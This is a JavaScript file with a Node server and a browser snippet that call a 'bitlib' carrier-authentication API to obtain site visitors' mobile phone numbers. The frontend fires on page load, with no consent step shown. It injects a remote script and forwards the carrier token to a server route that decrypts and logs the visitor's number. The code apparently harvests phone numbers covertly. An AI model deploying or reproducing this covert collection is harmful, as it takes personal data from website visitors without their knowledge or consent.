
// ============= 服务端  ==================== 
var NodeRSA = require('node-rsa');
var request = require('request');


var find_link = function(link, params) {
  return new Promise(resolve => {
    var f = function(link) {
      var options = {
        url: link,
        followRedirect: false,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(params),
      };

      request(options, function(error, response) {
        if (response.statusCode == 301 || response.statusCode == 302) {
          var location = response.headers.location;
          resolve(location);
        } else {
          resolve(link);
        }
      });
    };

    f(link);
  });
};

var privateKey = new NodeRSA(`-----BEGIN PRIVATE KEY-----
${bitlib_private_key}
-----END PRIVATE KEY-----`);
var key = bitlib_key;

privateKey.setOptions({
  signingScheme: 'sha256',
  encryptionScheme: 'pkcs1',
});

router.get('/precheck', async function() {
  const platform = this.headers['user-agent'].match(
    /\(i[^;]+;( U;)? CPU.+Mac OS X/
  )
    ? 0
    : 1;
  let timestamp = parseInt(new Date().getTime() / 1000);
  let prestr = `key=${key}&platform=${platform}&timestamp=${timestamp}`;
  let params = {
    key: key,
    platform,
    format: 'jsonp',
    timestamp,
  };

  var sign = privateKey.sign(prestr, 'hex', 'utf-8');
  params.sign = sign;

  let precheck_url = await find_link(
    'https://api.bitlib.cc/api/v1/auth/precheck',
    params
  );

  this.body = {
    result: 'ok',
    data: precheck_url,
  };
});

router.get('/phone', async function() {
  const query = this.query;
  const {
    operatorType: operator_type,
    accessCode: token,
    mobile,
  } = query;
  let timestamp = parseInt(new Date().getTime() / 1000);

  let prestr = `key=${key}&mobile=${mobile}&operator_type=${operator_type}&timestamp=${timestamp}&token=${token}`;
  let params = {
    key: key,
    ...query,
    token,
    operator_type,
    timestamp,
  };

  var sign = privateKey.sign(prestr, 'hex', 'utf-8');
  params.sign = sign;

  await fetch('https://api.bitlib.cc/api/v1/auth/phone', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(params),
  })
    .then(res => res.json())
    .then(res => {
      if (res && res.phone) {
        const decrypted = privateKey.decrypt(
          Buffer.from(res.phone, 'hex'),
          'utf8'
        );
        console.log(decrypted)
      }
    });

  this.body = {
    result: 'ok',
  };
});

module.exports = router.routes();






// ============= 前端  ==================== 
function fetchData(url, params, callback) {
    try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url + '?' + json2param(params), true);
    xhr.onreadystatechange = function() {
        if (xhr.status == 200) {
        var result = '';
        if (xhr.responseType === 'text') {
            result = xhr.responseText;
        } else if (xhr.responseType === 'document') {
            result = xhr.responseXML;
        } else {
            result = xhr.response;
        }
        if (callback && result) {
            callback(result, xhr.status);
            callback = null;
        }
        }
    };
    xhr.send();
    } catch (e) {}
}
var url_check = '/bitlib/precheck';
var url_phone = '/bitlib/phone';

fetchData(url_check, {}, function(result) {
    try {
        var res = JSON.parse(result);
        var redirectUrl = res.data;
        if (redirectUrl) {
            var bitlib = document.createElement('script');
            bitlib.src = redirectUrl;
            window.reply = function(res) {
                var data = res.data;
                var url = encodeURIComponent(location.href);
                try {
                var _url = qs.parse(location.search).id;
                if (_url) url = _url;
                } catch (e) {}
                document.body.removeChild(bitlib);
                fetchData(url_phone, data);
            };
            document.body.appendChild(bitlib);
        }
    } catch (e) {}
});